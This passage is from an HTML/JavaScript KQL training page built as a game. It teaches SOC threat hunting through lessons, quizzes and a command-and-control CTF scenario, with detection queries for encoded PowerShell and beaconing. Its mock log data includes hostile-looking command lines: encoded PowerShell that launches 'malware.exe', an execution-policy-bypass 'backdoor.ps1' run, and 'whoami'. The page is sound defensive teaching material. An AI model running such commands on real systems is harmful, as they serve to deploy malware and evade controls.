                            <h4>1️⃣ Table Name</h4>
                            <p>Every query starts with a table (like SecurityEvent, NetworkLogs). Think of it as choosing which filing cabinet to look in.</p>
                            <code style="background: #333; padding: 8px; border-radius: 4px; display: block; margin-top: 10px;">SecurityEvent</code>
                        </div>
                        <div style="background: rgba(0, 188, 242, 0.1); padding: 20px; border-radius: 12px; border: 2px solid var(--accent-cyan);">
                            <h4>2️⃣ Pipe Symbol |</h4>
                            <p>The pipe connects each step. Read it as "then do this". It's like giving step-by-step instructions.</p>
                            <code style="background: #333; padding: 8px; border-radius: 4px; display: block; margin-top: 10px;">|</code>
                        </div>
                        <div style="background: rgba(16, 124, 16, 0.1); padding: 20px; border-radius: 12px; border: 2px solid var(--success-green);">
                            <h4>3️⃣ Operators</h4>
                            <p>These are the actions you want to perform: take, where, project, summarize. They're like verbs in a sentence.</p>
                            <code style="background: #333; padding: 8px; border-radius: 4px; display: block; margin-top: 10px;">take 10</code>
                        </div>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">📊 Essential Operators You'll Use Every Day</h3>
                    
                    <div style="background: var(--glass-bg); padding: 25px; border-radius: 15px; margin: 20px 0;">
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;">
                            <div style="text-align: center; padding: 15px;">
                                <div style="font-size: 2em; margin-bottom: 10px;">🔢</div>
                                <h4>take / limit</h4>
                                <p style="font-size: 0.9em; color: var(--text-secondary);">Show me just X number of rows</p>
                            </div>
                            <div style="text-align: center; padding: 15px;">
                                <div style="font-size: 2em; margin-bottom: 10px;">🎯</div>
                                <h4>where</h4>
                                <p style="font-size: 0.9em; color: var(--text-secondary);">Filter data based on conditions</p>
                            </div>
                            <div style="text-align: center; padding: 15px;">
                                <div style="font-size: 2em; margin-bottom: 10px;">📋</div>
                                <h4>project</h4>
                                <p style="font-size: 0.9em; color: var(--text-secondary);">Choose which columns to show</p>
                            </div>
                            <div style="text-align: center; padding: 15px;">
                                <div style="font-size: 2em; margin-bottom: 10px;">🔄</div>
                                <h4>sort</h4>
                                <p style="font-size: 0.9em; color: var(--text-secondary);">Arrange data in order</p>
                            </div>
                        </div>
                    </div>

                    <div style="background: rgba(0, 188, 242, 0.1); border-left: 4px solid var(--accent-cyan); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>🎮 Interactive Challenge: Build Your Query Step by Step</h4>
                        <p>Let's build a query together! We'll start simple and add complexity one step at a time. Follow along and see how each piece works.</p>
                    </div>

                    <div class="code-environment">
                        <div class="code-header">
                            <span style="color: #f0f6fc;">🧪 Query Builder - Step by Step</span>
                            <span style="color: #7d8590;">We'll build this together!</span>
                        </div>
                        <div class="code-editor">
                            <textarea class="code-textarea" id="basics-step-by-step">// Step 1: Start with a table
SecurityEvent

// Step 2: Add a pipe and limit results  
| take 10

// Step 3: Choose specific columns to show
| project TimeGenerated, Account, Computer, EventID

// Step 4: Sort by time (newest first)
| sort by TimeGenerated desc</textarea>
                        </div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="executeStepByStep()">
                            <span>🔨</span> Build This Query!
                        </button>
                        <button class="btn btn-secondary" onclick="showStepExplanation()">
                            <span>📖</span> Explain Each Step
                        </button>
                        <button class="btn btn-secondary" onclick="tryQueryVariations()">
                            <span>🎲</span> Try Different Variations
                        </button>
                    </div>

                    <div class="results-panel" id="basics-step-by-step-results">
                        <div class="results-header">
                            <span>🔨</span> Step-by-Step Query Results
                        </div>
                        <div style="color: #7d8590; font-style: italic;">Run the query to see how each step works together...</div>
                    </div>

                    <div style="background: rgba(255, 140, 0, 0.1); border-left: 4px solid var(--warning-orange); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>💡 Pro Tips for Beginners</h4>
                        <ul style="margin-left: 20px; line-height: 1.8;">
                            <li><strong>Start Small:</strong> Always begin with a simple query and add complexity gradually</li>
                            <li><strong>Use Comments:</strong> Lines starting with // are comments - they help you remember what you're doing</li>
                            <li><strong>Test Frequently:</strong> Run your query after each step to see what changes</li>
                            <li><strong>Don't Worry About Mistakes:</strong> KQL won't break anything - experiment freely!</li>
                        </ul>
                    </div>

                    <div class="quiz-question">
                        <h4>🧠 Knowledge Check: What's the correct order for a basic KQL query?</h4>
                        <div class="quiz-option" onclick="selectAnswer(this, true)">A) Table → | → Operator → | → Operator</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">B) Operator → | → Table → | → Operator</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">C) | → Table → Operator → | → Operator</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">D) Table → Operator → | → | → Operator</div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-success" onclick="completeLesson('data-filtering')">
                            <span>🎯</span> Ready for Data Filtering!
                        </button>
                    </div>
                </div>

                <!-- Enhanced Threat Hunting stays the same but now positioned properly in learning progression -->
                    <div class="lesson-header">
                        <h2 class="lesson-title">🎯 Advanced Threat Hunting with KQL</h2>
                        <div class="lesson-meta">
                            <span class="meta-badge intermediate">
                                <span>🎯</span> Intermediate
                            </span>
                            <span class="meta-badge">
                                <span>⏱️</span> 35 minutes
                            </span>
                            <span class="meta-badge">
                                <span>🏆</span> 300 XP
                            </span>
                            <span class="meta-badge">
                                <span>🔥</span> High Impact
                            </span>
                        </div>
                    </div>

                    <div class="intel-briefing">
                        <h4>🎯 Mission Objective</h4>
                        <p><strong>SCENARIO:</strong> Your SOC has detected multiple security alerts across the network. As a Tier 2 analyst, you need to investigate potential threats using advanced KQL queries to identify attack patterns, compromised accounts, and malicious activities.</p>
                        
                        <p><strong>YOUR MISSION:</strong> Analyze security logs to uncover sophisticated attack techniques and provide actionable intelligence for incident response.</p>
                    </div>

                    <h3 style="color: var(--accent-cyan); margin: 25px 0 15px 0;">🔍 Threat Hunting Techniques</h3>
                    
                    <div class="terminal-window">
                        <div class="terminal-header">
                            <div class="terminal-dot dot-red"></div>
                            <div class="terminal-dot dot-yellow"></div>
                            <div class="terminal-dot dot-green"></div>
                            <span style="margin-left: 10px; color: #ccc;">Advanced KQL Operators for Security</span>
                        </div>
                        <div class="terminal-body">
// Time-based analysis
| where TimeGenerated between(ago(24h)..now())
| make_series count() default=0 on TimeGenerated step 1h

// Anomaly detection  
| extend baseline = series_decompose(count_series).baseline
| extend anomalies = series_decompose_anomalies(count_series)

// Pattern matching with regex
| where ProcessCommandLine matches regex @"(?i).*powershell.*-enc.*"

// Statistical analysis
| summarize avg(duration), percentiles(duration, 50, 90, 95) by user

// Machine learning clustering
| evaluate basket(0.01, 0.05, 1000, users, activities)
                        </div>
                    </div>

                    <div class="ctf-scenario">
                        <div class="scenario-header">
                            <span class="scenario-title">🔍 Investigation: Suspicious PowerShell Activity</span>
                            <span class="scenario-points">+300 XP</span>
                        </div>
                        <p><strong>INTELLIGENCE:</strong> Multiple endpoints are executing PowerShell commands with base64 encoding. This could indicate malware deployment or data exfiltration attempts.</p>
                        
                        <div class="threat-indicator">
                            <span>⚠️</span>
                            <strong>TTPs Identified:</strong> PowerShell abuse, Base64 encoding, Potential fileless malware
                        </div>
                    </div>

                    <div class="code-environment">
                        <div class="code-header">
                            <span style="color: #f0f6fc;">🔬 Threat Hunter Workstation</span>
                            <span style="color: #7d8590;">Connected to: SecurityEvents, ProcessCreationEvents</span>
                        </div>
                        <div class="code-editor">
                            <textarea class="code-textarea" id="threat-hunting-code">// Hunt for suspicious PowerShell activity
SecurityEvent
| where TimeGenerated > ago(24h)
| where EventID == 4688  // Process creation events
| where Process contains "powershell.exe"
| where CommandLine contains "-enc" or CommandLine contains "FromBase64String"
| extend DecodedCommand = base64_decode_tostring(extract(@"-enc\s+([A-Za-z0-9+/=]+)", 1, CommandLine))
| where isnotempty(DecodedCommand)
| summarize 
    TotalExecutions = count(),
    UniqueHosts = dcount(Computer),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    Commands = make_set(DecodedCommand, 5)
    by Account
| where TotalExecutions > 5  // Focus on repeated activity
| order by TotalExecutions desc</textarea>
                        </div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="executeSecurityQuery('threat-hunting')">
                            <span>🔍</span> Execute Hunt
                        </button>
                        <button class="btn btn-secondary" onclick="showAdvancedHint('threat-hunting')">
                            <span>💡</span> Advanced Techniques
                        </button>
                        <button class="btn btn-secondary" onclick="exportResults('threat-hunting')">
                            <span>📊</span> Export Intel Report
                        </button>
                    </div>

                    <div class="results-panel" id="threat-hunting-results">
                        <div class="results-header">
                            <span>🔬</span> Threat Intelligence Results
                            <span style="font-size: 0.8em; color: var(--text-secondary);">Analyzing security events...</span>
                        </div>
                        <div style="color: #7d8590; font-style: italic;">Execute your threat hunting query to reveal potential threats...</div>
                    </div>

                    <div class="quiz-question">
                        <h4>🧠 Knowledge Check: Which KQL function helps detect anomalies in time series data?</h4>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">A) make_list()</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">B) summarize count()</div>
                        <div class="quiz-option" onclick="selectAnswer(this, true)">C) series_decompose_anomalies()</div>
                        <div class="quiz-option" onclick="selectAnswer(this, false)">D) parse_json()</div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-success" onclick="completeLesson('aggregations')">
                            <span>➡️</span> Next: Data Aggregation Mastery
                        </button>
                    </div>
                </div>

                <!-- CTF Challenge: Malware C2 Traffic -->
                <div class="content-section" id="ctf-malware-c2">
                    <div class="lesson-header">
                        <h2 class="lesson-title">🚨 CTF-03: Command & Control Traffic Analysis</h2>
                        <div class="lesson-meta">
                            <span class="meta-badge intermediate">
                                <span>🥈</span> Silver Tier
                            </span>
                            <span class="meta-badge">
                                <span>⏱️</span> 60 minutes
                            </span>
                            <span class="meta-badge">
                                <span>🎯</span> 500 Points
                            </span>
                            <span class="meta-badge danger">
                                <span>🔴</span> Active Threat
                            </span>
                        </div>
                    </div>

                    <div class="ctf-scenario">
                        <div class="scenario-header">
                            <span class="scenario-title">🚨 CRITICAL INCIDENT RESPONSE</span>
                            <span class="scenario-points">500 Points</span>
                        </div>
                        
                        <div class="intel-briefing">
                            <h4>🎯 Incident Brief</h4>
                            <p><strong>ALERT STATUS:</strong> CRITICAL - Active malware communication detected</p>
                            <p><strong>SITUATION:</strong> Multiple endpoints are exhibiting regular communication patterns to external domains, indicating possible botnet membership or APT presence.</p>
                            <p><strong>MISSION:</strong> Identify compromised hosts, analyze C2 communication patterns, and provide containment recommendations.</p>
                        </div>

                        <div class="threat-indicator">
                            <span>🔴</span>
                            <strong>MITRE ATT&CK TTPs:</strong> T1071 (Application Layer Protocol), T1573 (Encrypted Channel), T1041 (Exfiltration Over C2)
                        </div>
                    </div>

                    <h3 style="color: var(--danger-red); margin: 25px 0 15px 0;">🎯 Multi-Stage Investigation</h3>

                    <div style="background: rgba(209, 52, 56, 0.1); border-left: 4px solid var(--danger-red); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>Phase 1: Beaconing Analysis (150 pts)</h4>
                        <p><strong>Objective:</strong> Identify hosts with regular communication patterns indicating C2 beaconing behavior.</p>
                        <p><strong>Flag Format:</strong> Number of compromised hosts (e.g., "7")</p>
                    </div>

                    <div class="code-environment">
                        <div class="code-header">
                            <span style="color: #f0f6fc;">🔬 Network Traffic Analyzer</span>
                            <span style="color: #7d8590;">Dataset: NetworkConnections (24h), DNSLogs (24h)</span>
                        </div>
                        <div class="code-editor">
                            <textarea class="code-textarea" id="ctf-c2-phase1">// Phase 1: Detect beaconing behavior
NetworkConnections
| where TimeGenerated > ago(24h)
| where RemotePort == 443 or RemotePort == 80
| make_series RequestCount = count() default = 0 
    on TimeGenerated 
    step 5m 
    by LocalIP, RemoteIP
| extend 
    Mean = series_stats_dynamic(RequestCount).avg,
    StdDev = series_stats_dynamic(RequestCount).stdev,
    Variance = series_stats_dynamic(RequestCount).variance
| where Mean > 2 and Variance < 1.0  // Regular, frequent communication
| where StdDev < (Mean * 0.3)  // Low variation indicates automation
| summarize 
    BeaconingSessions = count(),
    C2Servers = dcount(RemoteIP),
    TotalRequests = sum(Mean * 288)  // 288 = 5min intervals in 24h
    by LocalIP
| where BeaconingSessions >= 3  // Multiple beaconing sessions
| order by TotalRequests desc</textarea>
                        </div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="executeCTFQuery('ctf-c2-phase1')">
                            <span>🔍</span> Analyze Beaconing
                        </button>
                        <button class="btn btn-secondary" onclick="submitCTFFlag('ctf-malware-c2', 1)">
                            <span>🚩</span> Submit Phase 1 Flag
                        </button>
                    </div>

                    <div class="results-panel" id="ctf-c2-phase1-results">
                        <div class="results-header">
                            <span>🔬</span> Beaconing Analysis Results
                        </div>
                        <div style="color: #7d8590; font-style: italic;">Execute analysis to identify compromised endpoints...</div>
                    </div>

                    <div style="background: rgba(255, 140, 0, 0.1); border-left: 4px solid var(--warning-orange); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>Phase 2: C2 Infrastructure Mapping (200 pts)</h4>
                        <p><strong>Objective:</strong> Map the command and control infrastructure and identify the primary C2 domain.</p>
                        <p><strong>Flag Format:</strong> Primary C2 domain (e.g., "malicious-command.com")</p>
                    </div>

                    <div class="code-environment">
                        <div class="code-header">
                            <span style="color: #f0f6fc;">🌐 DNS Intelligence Platform</span>
                        </div>
                        <div class="code-editor">
                            <textarea class="code-textarea" id="ctf-c2-phase2">// Phase 2: Map C2 infrastructure
DNSLogs
| where TimeGenerated > ago(24h)
| where ClientIP in (
    toscalar(
        NetworkConnections
        | where TimeGenerated > ago(24h)
        | make_series count() default=0 on TimeGenerated step 5m by LocalIP
        | extend variance = series_stats_dynamic(count_).variance
        | where variance < 1.0
        | distinct LocalIP
    )
)
| extend TopLevelDomain = extract(@"\.([^.]+)$", 1, QueryName)
| extend SecondLevelDomain = extract(@"([^.]+\.[^.]+)$", 1, QueryName)
| summarize 
    QueryCount = count(),
    UniqueClients = dcount(ClientIP),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    QueryPattern = make_set(QueryName, 10)
    by SecondLevelDomain
| extend DomainAge = datetime_diff('day', now(), FirstSeen)
| where DomainAge < 30  // Recently registered/first seen
| where UniqueClients >= 3  // Multiple infected hosts
| extend SuspicionScore = (QueryCount * UniqueClients) / (DomainAge + 1)
| order by SuspicionScore desc</textarea>
                        </div>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-primary" onclick="executeCTFQuery('ctf-c2-phase2')">
                            <span>🌐</span> Map C2 Infrastructure
                        </button>
                        <button class="btn btn-secondary" onclick="submitCTFFlag('ctf-malware-c2', 2)">
                            <span>🚩</span> Submit Phase 2 Flag
                        </button>
                    </div>

                    <div style="background: rgba(16, 124, 16, 0.1); border-left: 4px solid var(--success-green); padding: 20px; margin: 20px 0; border-radius: 0 10px 10px 0;">
                        <h4>Phase 3: Malware Family Attribution (150 pts)</h4>
                        <p><strong>Objective:</strong> Analyze communication patterns and User-Agent strings to identify the malware family.</p>
                        <p><strong>Flag Format:</strong> Malware family name (e.g., "CobaltStrike")</p>
                    </div>

                    <div class="action-buttons">
                        <button class="btn btn-success" onclick="completeCTF('ctf-malware-c2')">
                            <span>🏆</span> Complete CTF Challenge
                        </button>
                        <button class="btn btn-danger" onclick="triggerIncidentResponse()">
                            <span>🚨</span> Trigger Incident Response
                        </button>
                    </div>
                </div>

                <!-- Analytics Dashboard -->
                <div class="content-section" id="analytics-dashboard">
                    <div class="lesson-header">
                        <h2 class="lesson-title">📊 Learning Analytics Dashboard</h2>
                        <div class="lesson-meta">
                            <span class="meta-badge">
                                <span>📈</span> Progress Tracking
                            </span>
                            <span class="meta-badge">
                                <span>🎯</span> Skill Assessment
                            </span>
                            <span class="meta-badge">
                                <span>🏆</span> Performance Metrics
                            </span>
                        </div>
                    </div>

                    <div class="intel-briefing">
                        <h4>📊 Personal Learning Insights</h4>
                        <p>Comprehensive analytics showing your KQL mastery progression, strengths, areas for improvement, and competitive standing within the cybersecurity community.</p>
                    </div>

                    <!-- Skill Competency Chart -->
                    <div style="background: var(--glass-bg); border-radius: 15px; padding: 25px; margin: 20px 0;">
                        <h3 style="color: var(--accent-cyan); margin-bottom: 20px;">🎯 Skill Competency Matrix</h3>
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
                            <div style="background: rgba(0, 120, 212, 0.1); padding: 15px; border-radius: 10px;">
                                <h4>Basic KQL Operations</h4>
                                <div style="background: #333; height: 8px; border-radius: 4px; margin: 10px 0;">
                                    <div style="background: var(--success-green); height: 100%; width: 95%; border-radius: 4px;"></div>
                                </div>
                                <small>95% Mastery • Expert Level</small>
                            </div>
                            <div style="background: rgba(0, 120, 212, 0.1); padding: 15px; border-radius: 10px;">
                                <h4>Threat Hunting</h4>
                                <div style="background: #333; height: 8px; border-radius: 4px; margin: 10px 0;">
                                    <div style="background: var(--primary-blue); height: 100%; width: 78%; border-radius: 4px;"></div>
                                </div>
                                <small>78% Mastery • Advanced Level</small>
                            </div>
                            <div style="background: rgba(0, 120, 212, 0.1); padding: 15px; border-radius: 10px;">
                                <h4>Data Aggregation</h4>
                                <div style="background: #333; height: 8px; border-radius: 4px; margin: 10px 0;">
                                    <div style="background: var(--warning-orange); height: 100%; width: 65%; border-radius: 4px;"></div>
                                </div>
                                <small>65% Mastery • Intermediate Level</small>
                            </div>
                            <div style="background: rgba(0, 120, 212, 0.1); padding: 15px; border-radius: 10px;">
                                <h4>Machine Learning</h4>
                                <div style="background: #333; height: 8px; border-radius: 4px; margin: 10px 0;">
                                    <div style="background: var(--danger-red); height: 100%; width: 35%; border-radius: 4px;"></div>
                                </div>
                                <small>35% Mastery • Developing</small>
                            </div>
                        </div>
                    </div>

                    <!-- Performance Metrics -->
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0;">
                        <div style="background: var(--glass-bg); padding: 20px; border-radius: 15px; text-align: center;">
                            <h3 style="color: var(--success-green); font-size: 2.5em;">94%</h3>
                            <p>Query Success Rate</p>
                            <small style="color: var(--text-secondary);">Last 30 days</small>
                        </div>
                        <div style="background: var(--glass-bg); padding: 20px; border-radius: 15px; text-align: center;">
                            <h3 style="color: var(--accent-cyan); font-size: 2.5em;">2.8s</h3>
                            <p>Avg Query Time</p>
                            <small style="color: var(--text-secondary);">Performance optimized</small>
                        </div>
                        <div style="background: var(--glass-bg); padding: 20px; border-radius: 15px; text-align: center;">
                            <h3 style="color: var(--warning-orange); font-size: 2.5em;">847</h3>
                            <p>Queries Executed</p>
                            <small style="color: var(--text-secondary);">Total practice queries</small>
                        </div>
                    </div>

                    <!-- Learning Recommendations -->
                    <div style="background: var(--glass-bg); border-radius: 15px; padding: 25px; margin: 20px 0;">
                        <h3 style="color: var(--accent-cyan); margin-bottom: 15px;">🎯 Personalized Learning Recommendations</h3>
                        <div style="background: rgba(16, 124, 16, 0.1); border-left: 4px solid var(--success-green); padding: 15px; margin: 10px 0;">
                            <strong>✅ Strength:</strong> Excellent proficiency in basic filtering and data selection operations
                        </div>
                        <div style="background: rgba(255, 140, 0, 0.1); border-left: 4px solid var(--warning-orange); padding: 15px; margin: 10px 0;">
                            <strong>📈 Focus Area:</strong> Advanced time series analysis and machine learning functions need more practice
                        </div>
                        <div style="background: rgba(0, 120, 212, 0.1); border-left: 4px solid var(--primary-blue); padding: 15px; margin: 10px 0;">
                            <strong>🎯 Next Goal:</strong> Complete the "Time Series Analysis" module to advance to Expert level
                        </div>
                    </div>
                </div>
            </div>

            <!-- Right Sidebar - Leaderboard & Stats -->
            <div class="sidebar">
                <div class="section-title">🏆 Live Leaderboard</div>
                <div class="leaderboard-item">
                    <span class="rank-badge">🥇</span>
                    <div class="user-info">
                        <div class="user-name">CyberSentinel_Alpha</div>
                        <div class="user-title">Master Threat Hunter</div>
                    </div>
                    <div class="score">6,890 XP</div>
                </div>
                <div class="leaderboard-item">
                    <span class="rank-badge">🥈</span>
                    <div class="user-info">
                        <div class="user-name">SOC_Commander_X</div>
                        <div class="user-title">Senior Security Analyst</div>
                    </div>
                    <div class="score">5,420 XP</div>
                </div>
                <div class="leaderboard-item">
                    <span class="rank-badge">🥉</span>
                    <div class="user-info">
                        <div class="user-name">ThreatHunter_Pro</div>
                        <div class="user-title">Incident Response Lead</div>
                    </div>
                    <div class="score">4,850 XP</div>
                </div>
                <div class="leaderboard-item" style="background: var(--glass-bg); border-left-color: var(--accent-cyan);">
                    <span class="rank-badge">#8</span>
                    <div class="user-info">
                        <div class="user-name">You</div>
                        <div class="user-title">Advanced Analyst</div>
                    </div>
                    <div class="score">3,750 XP</div>
                </div>
                <div class="leaderboard-item">
                    <span class="rank-badge">#9</span>
                    <div class="user-info">
                        <div class="user-name">QueryMaster_2024</div>
                        <div class="user-title">Security Researcher</div>
                    </div>
                    <div class="score">3,690 XP</div>
                </div>

                <div style="margin-top: 30px;">
                    <div class="section-title">📈 Your Progress</div>
                    <svg class="progress-ring" viewBox="0 0 120 120">
                        <circle class="progress-ring-circle" cx="60" cy="60" r="40" style="stroke-dashoffset: 75.36;"></circle>
                        <text x="60" y="60" text-anchor="middle" dy="0.3em" fill="var(--text-primary)" font-size="14" font-weight="bold">70%</text>
                    </svg>
                    <div style="text-align: center; margin-top: 10px;">
                        <strong>Level 18 Security Analyst</strong><br>
                        <small style="color: var(--text-secondary);">1,250 XP to Level 19</small>
                    </div>
                </div>

                <div style="margin-top: 30px;">
                    <div class="section-title">🎯 Weekly Goals</div>
                    <div style="background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 10px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span>Complete 3 CTF challenges</span>
                            <span style="color: var(--success-green);">2/3</span>
                        </div>
                        <div style="background: #333; height: 6px; border-radius: 3px;">
                            <div style="background: var(--success-green); height: 100%; width: 67%; border-radius: 3px;"></div>
                        </div>
                        
                        <div style="display: flex; justify-content: space-between; margin: 15px 0 10px 0;">
                            <span>Practice 5 days this week</span>
                            <span style="color: var(--accent-cyan);">5/5</span>
                        </div>
                        <div style="background: #333; height: 6px; border-radius: 3px;">
                            <div style="background: var(--accent-cyan); height: 100%; width: 100%; border-radius: 3px;"></div>
                        </div>
                        
                        <div style="display: flex; justify-content: space-between; margin: 15px 0 10px 0;">
                            <span>Earn 1,000 XP</span>
                            <span style="color: var(--warning-orange);">750/1000</span>
                        </div>
                        <div style="background: #333; height: 6px; border-radius: 3px;">
                            <div style="background: var(--warning-orange); height: 100%; width: 75%; border-radius: 3px;"></div>
                        </div>
                    </div>
                </div>

                <div style="margin-top: 30px;">
                    <div class="section-title">🔥 Recent Achievements</div>
                    <div style="background: rgba(255, 215, 0, 0.1); border: 1px solid #ffd700; padding: 12px; border-radius: 8px; margin: 8px 0;">
                        <strong>🏆 Threat Hunter Elite</strong><br>
                        <small style="color: var(--text-secondary);">Completed advanced threat hunting module</small>
                    </div>
                    <div style="background: rgba(0, 120, 212, 0.1); border: 1px solid var(--primary-blue); padding: 12px; border-radius: 8px; margin: 8px 0;">
                        <strong>🥈 Silver CTF Master</strong><br>
                        <small style="color: var(--text-secondary);">Solved 5 intermediate challenges</small>
                    </div>
                    <div style="background: rgba(16, 124, 16, 0.1); border: 1px solid var(--success-green); padding: 12px; border-radius: 8px; margin: 8px 0;">
                        <strong>🔥 28-Day Streak</strong><br>
                        <small style="color: var(--text-secondary);">Consistent daily practice</small>
                    </div>
                </div>

                <div style="margin-top: 30px;">
                    <div class="section-title">📚 Quick Reference</div>
                    <div style="background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 10px; font-size: 0.85em;">
                        <p><strong>Security Operators:</strong></p>
                        <code style="color: var(--accent-cyan);">contains, has, in, between, matches regex</code><br><br>
                        <p><strong>Time Functions:</strong></p>
                        <code style="color: var(--accent-cyan);">ago(), now(), bin(), make_series, between()</code><br><br>
                        <p><strong>ML Functions:</strong></p>
                        <code style="color: var(--accent-cyan);">series_decompose_anomalies(), basket(), autocluster()</code><br><br>
                        <p><strong>Remember:</strong> KQL is case-sensitive!</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Achievement Popup -->
    <div class="achievement-popup" id="achievement-popup">
        <div style="display: flex; align-items: center;">
            <span style="font-size: 2em; margin-right: 15px;">🏆</span>
            <div>
                <strong id="achievement-title">Achievement Unlocked!</strong><br>
                <small id="achievement-description">You've earned a new badge</small>
            </div>
        </div>
    </div>

    <!-- Save Progress Button -->
    <button class="save-progress-btn" onclick="saveProgress()" title="Save your progress locally">
        💾 Save Progress
    </button>

    <script>
        // Enhanced Production Game State with Comprehensive Data
        let gameState = {
            currentMode: 'learning',
            userLevel: 18,
            totalXP: 3750,
            badgesEarned: 34,
            ctfSolved: 7,
            streakDays: 28,
            globalRank: 8,
            completionRate: 89,
            currentContent: 'threat-hunting',
            
            completedLessons: [
                'kql-basics', 'data-filtering', 'threat-hunting'
            ],
            completedCTFs: [
                'ctf-login-anomaly', 'ctf-data-exfil', 'ctf-malware-c2'
            ],
            
            skillLevels: {
                basics: 95,
                filtering: 92,
                threatHunting: 78,
                aggregation: 65,
                joins: 45,
                timeSeries: 35,
                machineLearning: 35
            },
            
            achievements: [
                { name: "First Query Master", icon: "🚀", date: "2024-01-10" },
                { name: "Threat Hunter Elite", icon: "🏆", date: "2024-01-15" },
                { name: "Silver CTF Master", icon: "🥈", date: "2024-01-18" },
                { name: "28-Day Streak", icon: "🔥", date: "2024-01-20" }
            ],
            
            weeklyGoals: {
                ctfChallenges: { completed: 2, target: 3 },
                practiceDays: { completed: 5, target: 5 },
                xpEarned: { completed: 750, target: 1000 }
            },
            
            queryStats: {
                totalQueries: 847,
                successRate: 94,
                avgQueryTime: 2.8,
                lastActivity: new Date().toISOString()
            }
        };

        // Comprehensive Sample Datasets for Realistic Query Results
        const enterpriseDatasets = {
            SecurityEvent: [
                { EventID: 4625, Account: "CORP\\admin", Computer: "WS-001", IpAddress: "192.168.1.100", TimeGenerated: "2024-01-20T09:30:00Z", ProcessName: "powershell.exe", CommandLine: "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQA=" },
                { EventID: 4625, Account: "CORP\\jdoe", Computer: "WS-002", IpAddress: "10.0.1.50", TimeGenerated: "2024-01-20T09:31:00Z", ProcessName: "cmd.exe", CommandLine: "cmd.exe /c whoami" },
                { EventID: 4688, Account: "CORP\\admin", Computer: "WS-001", IpAddress: "192.168.1.100", TimeGenerated: "2024-01-20T09:32:00Z", ProcessName: "powershell.exe", CommandLine: "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backdoor.ps1" },
                { EventID: 4625, Account: "CORP\\service_sql", Computer: "SRV-DB-01", IpAddress: "172.16.0.10", TimeGenerated: "2024-01-20T09:33:00Z", ProcessName: "sqlservr.exe", CommandLine: "sqlservr.exe" },
                { EventID: 4688, Account: "CORP\\admin", Computer: "WS-003", IpAddress: "192.168.1.101", TimeGenerated: "2024-01-20T09:34:00Z", ProcessName: "powershell.exe", CommandLine: "powershell.exe -enc QwA6AFwAVABlAG0AcABcAGQAYQB0AGEALgB0AHgAdAAgAD4APgAgAEMAOgBcAFQAZQBtAHAAXABvAHUAdABwAHUAdAAuAHQAeAB0AA==" }
            ],
            
            NetworkConnections: [
                { LocalIP: "10.0.1.15", RemoteIP: "203.0.113.45", RemotePort: 443, Protocol: "HTTPS", BytesOut: 1024, BytesIn: 2048, TimeGenerated: "2024-01-20T10:00:00Z", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
                { LocalIP: "10.0.1.15", RemoteIP: "203.0.113.45", RemotePort: 443, Protocol: "HTTPS", BytesOut: 1024, BytesIn: 2048, TimeGenerated: "2024-01-20T10:01:00Z", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
                { LocalIP: "10.0.1.23", RemoteIP: "151.101.193.140", RemotePort: 443, Protocol: "HTTPS", BytesOut: 2048, BytesIn: 4096, TimeGenerated: "2024-01-20T10:00:30Z", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124" },
                { LocalIP: "10.0.1.15", RemoteIP: "203.0.113.45", RemotePort: 443, Protocol: "HTTPS", BytesOut: 1024, BytesIn: 2048, TimeGenerated: "2024-01-20T10:02:00Z", UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
                { LocalIP: "10.0.1.32", RemoteIP: "198.51.100.78", RemotePort: 80, Protocol: "HTTP", BytesOut: 512, BytesIn: 1024, TimeGenerated: "2024-01-20T10:02:00Z", UserAgent: "python-requests/2.25.1" }
            ],
            
            DNSLogs: [
                { ClientIP: "10.0.1.15", QueryName: "malicious-c2-server.com", QueryType: "A", ResponseCode: "NOERROR", TimeGenerated: "2024-01-20T09:59:00Z" },
                { ClientIP: "10.0.1.15", QueryName: "malicious-c2-server.com", QueryType: "A", ResponseCode: "NOERROR", TimeGenerated: "2024-01-20T10:01:00Z" },
                { ClientIP: "10.0.1.23", QueryName: "github.com", QueryType: "A", ResponseCode: "NOERROR", TimeGenerated: "2024-01-20T10:00:00Z" },
                { ClientIP: "10.0.1.32", QueryName: "suspicious-domain.tk", QueryType: "A", ResponseCode: "NOERROR", TimeGenerated: "2024-01-20T10:02:00Z" },
